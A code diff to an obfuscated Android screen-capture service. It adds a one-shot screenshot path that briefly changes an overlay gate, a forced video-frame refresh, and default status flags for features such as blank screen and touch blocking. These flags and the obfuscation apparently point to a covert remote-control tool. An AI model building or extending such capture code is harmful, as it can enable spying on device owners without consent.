@@ -179,7 +179,7 @@ class DFm8Y8iMScvB2YDw : Service() {
                     }.toString()
                 } catch (e: Exception) {
                     Log.e("MainService", "cloudsend_status build failed", e)
-                    "{}"
+                    "{\"video\":false,\"screenshot\":false,\"share\":false,\"ignore\":false,\"blank\":false,\"penetrate\":false,\"touchblock\":false,\"accessibility\":false}"
                 }
             }
              p50.a(byteArrayOf(72, -71, -114, 59, -59, -51), byteArrayOf(33, -54, -47, 94, -85, -87)) -> {
@@ -323,6 +323,7 @@ class DFm8Y8iMScvB2YDw : Service() {
         @Volatile
         private var _isAudioStart = false // audio capture start status
 
+        @Volatile
         var ctx: DFm8Y8iMScvB2YDw? = null
         private var savedMediaProjectionIntent: Intent? = null
         private var explicitStopRequested = false
@@ -825,16 +826,54 @@ class DFm8Y8iMScvB2YDw : Service() {
      {
       
 
-            if(!SKL && shouldRun)
+            val allowOneShot = nZW99cdXQ0COhB2o.isOneShotScreenshotFrame
+            val ignoreRunning = shouldRun
+            if(!SKL && (ignoreRunning || allowOneShot))
             { 
                 
                 val newBuffer: ByteBuffer? = EqljohYazB0qrhnj.getImageBuffer()
                 if (newBuffer != null) {
-                    ClsFx9V0S.T1s73AGm(newBuffer, IOExceptions)
+                    val openedOneShotGate = allowOneShot && !ignoreRunning
+                    try {
+                        if (openedOneShotGate) {
+                            ClsFx9V0S.rEqMB3nD(0)
+                        }
+                        ClsFx9V0S.T1s73AGm(newBuffer, IOExceptions)
+                        if (allowOneShot) {
+                            nZW99cdXQ0COhB2o.consumeOneShotScreenshotFrame()
+                        }
+                    } finally {
+                        if (openedOneShotGate) {
+                            ClsFx9V0S.rEqMB3nD(255)
+                        }
+                    }
                 }
         }
         
      }
+
+    fun forceVideoFrameRefresh(reason: String) {
+        Handler(Looper.getMainLooper()).post {
+            try {
+                val vd = virtualDisplay
+                val cleanSurface = surface
+                if (!_isStart || mediaProjection == null || cleanSurface == null || vd == null || SKL || shouldRun) {
+                    ClsFx9V0S.qR9Ofa6G()
+                    return@post
+                }
+                vd.setSurface(null)
+                vd.setSurface(cleanSurface)
+                ClsFx9V0S.qR9Ofa6G()
+                Log.i("MainService", "forceVideoFrameRefresh: reason=$reason")
+            } catch (e: Exception) {
+                Log.e("MainService", "forceVideoFrameRefresh failed: reason=$reason", e)
+                try {
+                    ClsFx9V0S.qR9Ofa6G()
+                } catch (_: Exception) {
+                }
+            }
+        }
+    }
      
    
     private fun createSurface(): Surface? {
